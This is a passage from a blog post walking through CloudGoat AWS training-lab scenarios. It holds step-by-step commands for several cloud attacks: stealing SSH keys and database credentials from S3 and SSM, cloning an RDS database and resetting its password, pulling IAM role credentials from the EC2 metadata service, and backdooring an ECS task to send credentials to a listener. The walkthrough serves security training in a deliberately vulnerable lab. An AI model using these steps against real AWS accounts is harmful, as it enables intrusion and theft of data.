<span class="c"># cloudgoat -&gt;</span>
<span class="c"># cloudgoat -&gt;\dt</span>
<span class="c"># cloudgoat -&gt;select * from sensitive_information;</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/NlPfOEBxtuiAWY1.png" alt="012821-15-768x510" /></p><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/F8bSCgEjBV62ZI1.png" alt="012821-16-768x420" /></p><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/Wuk4rNJjtwVLiHT.png" alt="012821-17" /></p><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/7PmExID5pHhqiMe.png" alt="012821-18" /></p><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/NwfnIF4igUPLs5j.png" alt="012821-21" /></p><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/kEopOD1xcdgTahI.png" alt="012821-22" /></p><h4 id="mcducks-path">McDuck‚Äôs path</h4><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c"># The attacker explores the AWS environment and discovers they are able to list S3 buckets using their starting keys.</span>
<span class="c"># The attacker discovers several S3 buckets, but they are only able to access one of them. Inside that one S3 bucket they find a pair of SSH keys.</span>
<span class="c"># The attacker lists EC2 instances and finds the EC2 instance behind the Load Balancer.</span>
<span class="c"># The attacker discovers that the SSH keys found in the S3 bucket enable the attacker to log into the EC2 instance.</span>
<span class="c"># Now working through the EC2 instance (and therefore operating with its role instead of McDuck's), the attacker is able to discover and access a private S3 bucket.</span>
<span class="c"># Inside the private S3 bucket, the attacker finds a text file left behind by an irresponsible developer which contains the login credentials for an RDS database.</span>
<span class="c"># The attacker is able to list and discover the RDS database referenced in the credentials file.</span>
<span class="c"># The attacker is finally able to access the RDB database using the credentials they found in step 6 and acquire the scenario's goal: the secret text stored in the RDS database.</span>

</pre></table></code></div></div><ol><li>recon</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="c">#set command line parameters</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials


<span class="c"># ------------- 1. Deploying the resources gives us the access key and secret key</span>
<span class="nv">SRC_PROFILE</span><span class="o">=</span><span class="s1">'McDuck'</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s1">'xxx'</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s1">'yyy'</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="s1">'us-east-1'</span>
<span class="nv">USE_RNAME</span><span class="o">=</span><span class="s1">'McDuck'</span>


<span class="c"># ------------- 2. create a profile</span>
<span class="c"># aws configure --profile $SRC_PROFILE</span>
<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$SRC_PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>



<span class="c"># ------------- 3. enumerating the policies and permissions</span>
<span class="c"># lists S3 buckets, three S3 buckets,</span>
aws s3 <span class="nb">ls</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>
<span class="c"># unauthorized to access two of the three buckets.</span>
<span class="c"># have access to the keystore bucket, which contains SSH keys.</span>
aws s3 <span class="nb">ls </span>s3://&lt;bucket&gt; <span class="se">\</span>
    <span class="nt">--recursive</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>
<span class="c"># download the files</span>
aws s3 <span class="nb">cp </span>s3://&lt;bucket&gt;/key.pub <span class="nb">.</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>



<span class="c"># ------------- 4. identify if there is a load balancer or EC2 instance deployed and if we have access to it.</span>
<span class="c"># It‚Äôs the same EC2 instance and load balancer identified in Lara‚Äôs Path.</span>
aws elbv2 describe-load-balancers <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

<span class="c"># But this time we have an SSH key for the EC2 instance.</span>
<span class="c"># So try connecting to the EC2 instance. But first, change the permission of the SSH key.</span>
<span class="nb">chmod </span>777 key.pub

ssh <span class="nt">-i</span> private_key ubuntu@public.ip.of.ec2



<span class="c"># ------------- 5. in the ec2</span>
<span class="nb">sudo </span>apt-get <span class="nb">install </span>awscli

<span class="c"># access a private S3 bucket.</span>
aws s3 <span class="nb">ls
</span>aws s3 <span class="nb">ls </span>s3://&lt;bucket&gt; <span class="nt">--recursive</span>

<span class="c"># have access to the last S3 bucket</span>
<span class="c"># finds a ‚Äúdb.txt‚Äù contains the login credentials for an RDS database.</span>
aws s3 <span class="nb">cp </span>s3://&lt;bucket&gt;/db.txt <span class="nb">.</span>
<span class="nb">cat </span>db.txt

<span class="c"># list and discover the RDS database</span>
<span class="c"># need the address of the RDS instance.</span>
aws rds describe-db-instances <span class="nt">--region</span> us-east-1


<span class="c"># access the RDS database using the credentials and acquires the scenario's goal: the secret text stored in the RDS database!</span>
psql postgresql://&lt;db_user&gt;:&lt;db_password&gt;@&lt;rds-instance&gt;:5432/&lt;db_name&gt;
<span class="c"># cloudgoat -&gt;</span>
<span class="c"># cloudgoat -&gt;\dt</span>
<span class="c"># cloudgoat -&gt;select * from sensitive_information;</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.loli.net/2021/02/02/v3LKVyuXNCgrile.png" alt="012821-36" /></p><hr /><h3 id="scenarios-7-codebuild_secrets-large--hard">Scenarios 7: codebuild_secrets (Large / Hard)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>get the SSH keys which grant direct access to the EC2<tr><td>Size<td>Large<tr><td>Difficulty<td>Hard<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create codebuild_secrets</code></table></div><p>Starting as the IAM user Solo</p><ul><li>enumerates and explores CodeBuild projects,<li>finding insecured IAM keys for the IAM user Calrissian therein.<li>Then operating as Calrissian<li>discovers an RDS database.<li>Unable to access the database‚Äôs contents directly,<li>make clever use of the RDS snapshot functionality to acquire the scenario‚Äôs goal: a pair of secret strings.</ul><p>Alternatively</p><ul><li>explore SSM parameters and find SSH keys to an EC2 instance.<li>Using the metadata service, acquire the EC2 instance-profile‚Äôs keys and push deeper into the target environment<li>eventually gaining access to the original database and the scenario goal inside (a pair of secret strings) by a more circuitous route.</ul><h4 id="exploitation-route---1">Exploitation Route - 1</h4><p><img data-proofer-ignore data-src="https://i.imgur.com/oT6f4RK.png" alt="scenario6-1-1" /></p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
</pre><td class="rouge-code"><pre><span class="c">## Setting up the scenario</span>
python3 cloudgoat.py create codebuild_secrets
<span class="c"># have credentials of an IAM User "Solo" to being with.</span>


<span class="c">#set command line parameters</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials


<span class="c"># ------------- 1. Deploying the resources gives us the access key and secret key</span>
<span class="nv">SRC_PROFILE</span><span class="o">=</span><span class="s1">'solo'</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s1">'xxx'</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s1">'yyy'</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="s1">'us-east-1'</span>
<span class="c"># aws sts get-caller-identity --profile $SRC_PROFILE</span>
<span class="nv">USE_RNAME</span><span class="o">=</span><span class="s1">'solo'</span>


<span class="c"># ------------- 2. create a profile</span>
<span class="c"># aws configure --profile $SRC_PROFILE</span>
<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$SRC_PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"Set creds for profile </span><span class="nv">$SRC_PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>



<span class="c"># ------------- 3. enumerating the policies and permissions</span>
<span class="c"># use [enumerate-iam] script to see the user privileges</span>
<span class="c"># IAM User "Solo" has some EC2, CodeBuild, RDS, S3 and SSM related permissions.</span>

<span class="c"># enumeration using CodeBuild related permissions</span>
<span class="c"># list all the CodeBuild projects that IAM user "Solo" has access to.</span>
<span class="nv">BUILDPROJECTINFO</span><span class="o">=</span><span class="sb">`</span>aws codebuild list-projects <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span><span class="sb">`</span>
<span class="c"># cg-codebuild-cgidxgz5plnjdu</span>
<span class="c"># BUILDPROJECT=`echo $BUILDPROJECTINFO | jq -r .projects[]`</span>

<span class="c"># retrieve more information related to this build project.</span>
aws codebuild batch-get-projects <span class="se">\</span>
    <span class="nt">--names</span> cg-codebuild-cgidxgz5plnjdu <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

aws codebuild batch-get-projects <span class="se">\</span>
    <span class="nt">--names</span> cg-codebuild-cgidxgz5plnjdu <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"projects[*].environment"</span> <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>
<span class="c"># notice that the environment variables of the build project have some IAM security credentials</span>
<span class="c"># might possibly belong to an IAM User "Calrissian".</span>



<span class="c"># ------------- 4. credentail for Calrissian</span>
<span class="c"># To verify the credentials</span>
<span class="c"># create an AWS CLI named profile with the security credentials</span>
<span class="c"># run `aws sts get-caller-identity` for that profile.</span>

<span class="c"># use [enumerate-iam] script to see the user privileges</span>
<span class="c"># IAM User "Calrissian" has some EC2 and RDS related permissions.</span>



<span class="c"># ------------- 5. check RDS instances in the AWS account.</span>
aws rds describe-db-instances <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"DBInstances[*].[DBInstanceIdentifier, Engine , DBName]"</span> <span class="se">\</span>
    <span class="nt">--output</span> text <span class="se">\</span>
    <span class="nt">--profile</span> calrissian
<span class="c"># cg-rds-instance-cgidetofos97ig     postgres     securedb</span>

<span class="c"># There is an RDS instance in the AWS account that is using "PostgreSQL" but it is not publicly accessible.</span>
<span class="c"># This is our target RDS instance on which the secrets are stored in "securedb" database.</span>

<span class="c"># There are various ways to continue our exploitation</span>


<span class="c"># ------------- 6. create a snapshot of the running RDS instance</span>
<span class="c"># use snapshot to create another RDS instance that we can control, from which we can extract the secrets.</span>
<span class="c"># create a snapshot of the running RDS instance.</span>
aws rds create-db-snapshot <span class="se">\</span>
    <span class="nt">--db-snapshot-identifier</span> secrets-snapshot <span class="se">\</span>
    <span class="nt">--db-instance-identifier</span> cg-rds-instance-&lt;CLOUDGOAT-ID&gt; <span class="se">\</span>
    <span class="nt">--profile</span> calrissian

<span class="c"># create an RDS instance from the snapshot.</span>
<span class="c"># For us to be able to access the RDS Instance we create publicly, place it in appropriate subnet and security group.</span>

<span class="c"># 1. identify the subnet group of the already running RDS Instance.</span>
aws rds describe-db-subnet-groups <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"DBSubnetGroups[?contains(DBSubnetGroupName,'rds')]"</span> <span class="se">\</span>
    <span class="nt">--profile</span> calrissian

<span class="c"># 2. check if there is a security group that allows us to communicate with RDS service.</span>
aws ec2 describe-security-groups <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"SecurityGroups[?contains(Description,'RDS')]"</span> <span class="se">\</span>
    <span class="nt">--profile</span> calrissian

<span class="c"># create an RDS instance from the snapshot.</span>
aws rds restore-db-instance-from-db-snapshot <span class="se">\</span>
    <span class="nt">--db-instance-identifier</span> secrets-instance <span class="se">\</span>
    <span class="nt">--db-snapshot-identifier</span> secrets-snapshot <span class="se">\</span>
    <span class="nt">--db-subnet-group-name</span> &lt;SUBNET_GROUP_NAME&gt; <span class="se">\</span>
    <span class="nt">--publicly-accessible</span> <span class="se">\</span>
    <span class="nt">--vpc-security-group-ids</span> &lt;SECURITY_GROUP_NAME&gt; <span class="se">\</span>
    <span class="nt">--profile</span> calrissian

<span class="c"># Now have an RDS instance that we control, reset the Master User Password for the database.</span>
aws rds modify-db-instance <span class="se">\</span>
    <span class="nt">--db-instance-identifier</span> secrets-instance <span class="se">\</span>
    <span class="nt">--master-user-password</span> cloudgoat <span class="se">\</span>
    <span class="nt">--profile</span> calrissian

<span class="c"># retrieve the information about the new RDS instance, connect to the database and extract secrets.</span>
aws rds describe-db-instances <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"DBInstances[*].[DBInstanceIdentifier,Engine,DBName,Endpoint,MasterUsername]"</span> <span class="se">\</span>
    <span class="nt">--profile</span> calrissian
<span class="c"># got the rds address</span>


<span class="c"># to connect to the RDS instance</span>
<span class="c"># can use any PostgreSQL client to connect to the database and extract the secrets,</span>
<span class="c"># In this case, we are using `psql`, a command line PostgreSQL client -</span>
<span class="nb">sudo </span>apt <span class="nb">install </span>postgresql-client
psql <span class="nt">-h</span> &lt;INSTANCE-PUBLIC-DNS-NAME&gt; <span class="nt">-p</span> 5432 <span class="nt">-d</span> securedb <span class="nt">-U</span> cgadmin

<span class="c"># connected to the database, use PostgreSQL commands to extract the secrets.</span>
<span class="c"># securedb -&gt;</span>
<span class="c"># securedb -&gt; \dt</span>
<span class="c"># securedb -&gt; select * from sensitive_information;</span>
</pre></table></code></div></div><hr /><h4 id="exploitation-route---2">Exploitation Route - 2</h4><p><img data-proofer-ignore data-src="https://i.imgur.com/XOa1z69.png" alt="scenario6-2" /></p><blockquote><p>The above enumeration step was tricky and time consuming for me because the [enumerate-iam] script didn‚Äôt check for <code class="language-plaintext highlighter-rouge">SSM:DescribeParameters</code> permission. AWS Systems Manager Parameter Store provides secure, hierarchical storage for configuration data management and secrets management. can store data such as passwords, database strings, EC2 instance IDs, EC2 SSH Key Pairs and license codes as parameter values.</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
</pre><td class="rouge-code"><pre>
<span class="c"># use the IAM User "Solo" credentials and exploit the AWS account in a different way.</span>

<span class="c"># From the [enumerate-iam] script</span>
<span class="c"># the user has `SSM:DescribeParameters` permission.</span>
<span class="c"># allows to list the parameters stored in AWS Systems Manager Parameter Store.</span>
<span class="c"># By design, most of the parameters stored tend to be of sensitive nature.</span>

<span class="c">#  list all the parameters in the Parameter Store of the AWS account.</span>
aws ssm describe-parameters <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

<span class="c"># the Parameter Store has an EC2 SSH Key Pair.</span>
<span class="c"># download the SSH private key</span>
aws ssm get-parameter <span class="se">\</span>
    <span class="nt">--name</span> cg-ec2-private-key-cgidetofos97ig <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"Parameter.Value"</span> <span class="se">\</span>
    <span class="nt">--output</span> text <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span> | <span class="nb">tee </span>private-key

<span class="c"># check EC2 instances in the AWS account that we can use this SSH Key Pair against.</span>
aws ec2 describe-instances <span class="se">\</span>
    <span class="nt">--query</span> <span class="s2">"Reservations[*].Instances[*].[KeyName,PublicIpAddress,Tags]"</span> <span class="se">\</span>
    <span class="nt">--output</span> text <span class="se">\</span>
    <span class="nt">--profile</span> <span class="nv">$SRC_PROFILE</span>

<span class="c"># there is one EC2 instance that uses this SSH Key Pair. SSH into the EC2 instance -</span>
<span class="nb">chmod </span>400 private-key
ssh <span class="nt">-i</span> private-key ubuntu@&lt;PUBLIC_IP_OF_EC2_INSTANCE&gt;


<span class="c"># SSH into the SSH instance.</span>
<span class="c"># two successful ways to find secret strings stored in a secure RDS database.</span>


<span class="c">#### Route 2.1</span>

<span class="c"># have the access to EC2 instance, use the IMDS service to do further enumeration.</span>
<span class="c"># IMDS can be used to access user data that is specified when launching an EC2 instance. User Data tends to have sensitive information.</span>
curl http://169.254.169.254/latest/user-data
<span class="c"># The User Data on the EC2 contains set of commands to connect to RDS instance from the EC2 instance.</span>
<span class="c"># The command contains the credentials and endpoint for RDS Instance.</span>
<span class="c"># The file also reveals the secret that is stored on the RDS instance.</span>


<span class="c">#### Route 2.2</span>

<span class="c"># It is a common practice to attach IAM roles to EC2 instances.</span>
<span class="c"># Using this IAM roles the EC2 instance can interact with other AWS services in the AWS account.</span>
<span class="c"># Any overly permissive IAM role can lead to privilege escalation.</span>

<span class="c"># try and steal IAM Role credentials using IMDS.</span>
curl <span class="nt">-s</span> http://169.254.169.254/latest/meta-data/iam/security-credentials
curl <span class="nt">-s</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-&lt;CLOUDGOAT_ID&gt;

<span class="c"># The IAM role credentials we have stolen can be used like any other IAM identity credentials.</span>
<span class="c"># the IAM role credentials are short lived and have a session token.</span>
<span class="c"># The session token has to be manually added to the profile in the file `~/.aws/credentials` as `aws_session_token`.</span>
aws configure <span class="nt">--profile</span> stolen-creds

<span class="c"># use [enumerate-iam](https://github.com/andresriancho/enumerate-iam) script</span>
python enumerate-iam.py <span class="nt">--access-key</span> ACCESS-ID <span class="nt">--secret-key</span> SECRET-KEY <span class="nt">--session-token</span> SESSION-TOKEN
<span class="c"># Notice that the IAM role has some Lambda related permissions.</span>

<span class="c"># list all the Lambda functions in the AWS account.</span>
aws lambda list-functions <span class="nt">--profile</span> stolen-creds

<span class="c"># One of the Lambda functions has RDS instance database credentials in the environmant variables.</span>

<span class="c"># Now that we have all the information required to connect to the target RDS instance</span>
<span class="c"># use any PostgreSQL client to connect to the database and extract the secrets,</span>
<span class="c"># In this case, using `psql`, a command line PostgreSQL client -</span>

<span class="nb">sudo </span>apt <span class="nb">install </span>postgresql-client
psql <span class="nt">-h</span> &lt;INSTANCE-PUBLIC-DNS-NAME&gt; <span class="nt">-p</span> 5432 <span class="nt">-d</span> securedb <span class="nt">-U</span> cgadmin


<span class="c"># Once connected to the database, we can use commands to extract the secrets.</span>
<span class="c"># securedb -&gt;</span>
<span class="c"># securedb -&gt; \dt</span>
<span class="c"># securedb -&gt; select * from sensitive_information;</span>


<span class="c"># Destroy the scenario resources</span>
python3 cloudgoat.py destroy codebuild_secrets

</pre></table></code></div></div><hr /><h3 id="scenarios-8-ecs_efs_attack-large--hard">Scenarios 8: ecs_efs_attack (Large / Hard)</h3><div class="table-wrapper"><table><thead><tr><th>++<th>++<tbody><tr><td>Scenario Goal<td>get the SSH keys which grant direct access to the EC2<tr><td>Size<td>Large<tr><td>Difficulty<td>Hard<tr><td>Command<td><code class="language-plaintext highlighter-rouge">$ ./cloudgoat.py create ecs_efs_attack</code></table></div><p>Starting with access the ‚Äúruse‚Äù EC2</p><ul><li>the user leverages the instance profile to backdoor the running ECS container.<li>Using the backdoored container the attacker can retrieve credentials from the container metadata API.<li>These credentials allow to start a session on any EC2 with the proper tags set.<li>The attacker uses their permissions to change the tags on the Admin EC2 and starts a session.<li>Once in the Admin EC2, port scan the subnet for an open EFS to mount.<li>Once mounted, retrieve the flag from the elastic file system.</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/s63NaoU.png" alt="diagram" /></p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre>

<span class="c"># Access the "Ruse_Box" ec2 using the provide access key.</span>
ssh <span class="nt">-i</span> cloudgoat ubuntu@&lt;IP ADDRESS&gt;
<span class="c"># Configure the role credentials</span>
aws configure <span class="nt">--profile</span> ruse
aws iam list <span class="nt">--profile</span> ruse

<span class="c"># From the ec2 enumate permission.</span>

<span class="c"># list available ec2 and note how the tags are configured.</span>
aws ec2 describe-instances <span class="nt">--profile</span> ruse

<span class="c"># enumate existing ecs cluster and backdoor the existing task defniniton.</span>
aws ecs list-clusters <span class="nt">--profile</span> ruse
<span class="c"># List services in cloudgoat cluster</span>
aws ecs list-services <span class="nt">--cluster</span> &lt;CLUSTER ARN&gt; <span class="nt">--profile</span> ruse
<span class="c"># Download task definition</span>
aws ecs describe-task-definition <span class="se">\</span>
    <span class="nt">--task-definition</span> &lt;TASK_NAME&gt;:&lt;VERSION&gt; <span class="se">\</span>
    <span class="nt">--profile</span> ruse <span class="o">&gt;</span> task_def.json
<span class="c"># Download template to register a new task</span>
aws ecs register-task-definition <span class="se">\</span>
    <span class="nt">--generate-cli-skeleton</span> <span class="se">\</span>
    <span class="nt">--profile</span> ruse <span class="o">&gt;</span> task_template.json


<span class="c"># Now use task_def.json to fill out template.json with the desired payload.</span>

<span class="c"># register the template to replace the currently running task.</span>
register-task-definition <span class="nt">--cli-input-json</span> file://task_template.json <span class="nt">--profile</span> ruse
<span class="c"># Wait for the task to run and POST the credentials to your listener</span>

<span class="c"># With the new creds add them to "ruse_box"</span>
aws configure <span class="nt">--profile</span> ecs

<span class="c"># Modify admin ec2 tags</span>
aws ec2 create-tags <span class="se">\</span>
    <span class="nt">--resources</span> &lt;INSTANCE ID&gt; <span class="se">\</span>
    <span class="nt">--tags</span> <span class="nv">Key</span><span class="o">=</span>StartSession, <span class="nv">Value</span><span class="o">=</span><span class="nb">true</span>

<span class="c"># Using ecs creds start a session on admin ec2</span>
aws ssm start-session <span class="se">\</span>
    <span class="nt">--target</span> &lt;INSTANCE ID&gt; <span class="se">\</span>
    <span class="nt">--profile</span> ecs


<span class="c"># Update the existing service in the ecs cluster to execute the payload.</span>


<span class="c"># From the container credentilas use the SSM:StartSession privlage to access the admin_box.</span>


<span class="c"># Port scan the subnet to find available efs and mount.</span>
<span class="c"># Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.</span>
nmap <span class="nt">-Pn</span> <span class="nt">-P</span> 2049 <span class="nt">--open</span> 10.10.10.0/24


<span class="c"># Mount discovered ec2</span>
<span class="nb">cd</span> /mnt
<span class="nb">sudo mkdir</span> /efs
<span class="nb">sudo </span>mount <span class="nt">-t</span> nfs4 <span class="nt">-o</span> <span class="nv">nfsvers</span><span class="o">=</span>4.1,rsize<span class="o">=</span>1048576,wsize<span class="o">=</span>1048576,hard,timeo<span class="o">=</span>600,retrans<span class="o">=</span>2,noresvport &lt;IP ADDRESS OF EFS&gt;:/ efs

</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/cloudgoat/" class="post-tag no-text-decoration" >CloudGoat</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lab - CloudGoat [Level 1 - Level 8] - Grace&url=https://ocholuo.github.io//posts/CloudGoat/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lab - CloudGoat [Level 1 - Level 8] - Grace&u=https://ocholuo.github.io//posts/CloudGoat/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lab - CloudGoat [Level 1 - Level 8] - Grace&url=https://ocholuo.github.io//posts/CloudGoat/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - ‰∏ÄÂè•ËØùËß£ÈáäAWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/flaw/"><div class="card-body"> <span class="timeago small" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - CTFÔºöFlaw1.cloud [Level 1 - Level 6]</h3><div class="text-muted small"><p> [toc] CTFÔºöFlaw1 [Level 1 - Level 6] Level 1 - list S3 from outside http://flaws.cloud/ This level is *buckets* of fun. See if you can find the first sub-domain The site flaws....</p></div></div></a></div><div class="card"> <a href="/posts/flaw2/"><div class="card-body"> <span class="timeago small" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 